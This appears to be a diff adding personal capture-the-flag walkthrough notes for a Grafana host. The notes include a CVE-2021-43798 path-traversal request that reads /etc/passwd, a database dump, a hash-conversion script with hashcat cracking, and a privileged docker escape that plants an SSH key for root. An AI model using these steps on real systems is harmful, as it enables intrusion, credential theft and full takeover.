@@ -1,0 +1,116 @@
+nmap -SCV -vv -oA nmap/data ip address
+
+we see port 3000 open and its for a grafana web app
+
+we run a gobuster using port 3000
+
+gobuster dir -u http://10.129.179.201:3000/ -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -b 302
+
+tried to create an account, but signup has been suspended
+
+tried logging in using default credentials
+admin:admin
+
+default creds didnt work
+
+trying to find grafana release path notes
+
+currently on Grafana version 8.0
+
+looking for exploits
+
+found this exploit github 
+git clone https://github.com/pedrohavay/exploit-grafana-CVE-2021-43798
+
+we nee to create a venv 
+python3 -m venv venv
+
+run the venv 
+The github wasnt working
+
+
+found this github
+https://github.com/taythebot/CVE-2021-43798
+
+
+the exploits saying that there is a pre auth lfi vulnerability we can use 
+
+we need to start burpsuite and intercept the request and try to manually get /etc/passwd
+
+after we intercept 
+move the request to repeater
+
+change the request from login to 
+
+GET /public/plugins/alertlist/../../../../../../../../etc/passwd
+
+the lfi worked 
+clone the poc 
+
+we need to do a make build: using "make build"
+
+Dump sqlite3 database
+go run exploit.go -target <target> -dump-database
+go run exploit.go -target http://10.129.179.201:3000 -dump-database -output defaults.ini
+
+after the database is downloaded, open the database 
+
+open default.ini
+
+Browsing through the browse data, we find a usernamed boris
+we found the username,password hex,  salt and random numbers
+
+we need to chagne the password hex into a hash so we can crack it 
+
+hash format is PBKDF2-HMAC-SHA256 .
+
+use hashid -m {hash} and verify the encryption
+
+
+
+create a python script that converts hash/hex into hash thats crackable
+
+import base64
+import binascii
+
+password_hex = "dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8"
+SALT_STR = "LCBhdtJWjl"
+ITERATIONS = 10000
+
+try:
+    target_raw =  binascii.unhexlify(password_hex)
+except (binascii.Error, ValueError) as e:
+    print("ERROR: PASSWORD_HEX is not a valid hex:", e)
+
+
+target_hash64 = base64.b64encode(target_raw).decode("utf-8")
+salt64 = base64.b64encode(SALT_STR.encode("utf-8")).decode("utf-8")
+print(f"sha256:{ITERATIONS}:{salt64}:{target_hash64}")
+
+
+we put the full outcome into a hash.txt file 
+
+pass the hash text file into hashcat
+hashcat hashes -m  10900 /usr/share/wordlists/rockyou.txt
+
+after we got the name and password we can ssh into the box using the creds 
+
+we do a sudo -l 
+
+we can run /snap/bin/docker exec *
+
+cat /etc/hostname
+
+we connect to docker using 
+sudo docker exec -u root --privileged -it e6ff5b1cbc85 bash
+
+then we run the mount command
+
+mount
+we then mount /dev/sda1 /mnt
+
+we have to create our own pubic key and  echo it to /mnt/root/.ssh/authorized keys 
+
+we can do ssh keygen using 
+ssh-keygen -t ed25519 -f svc 
+
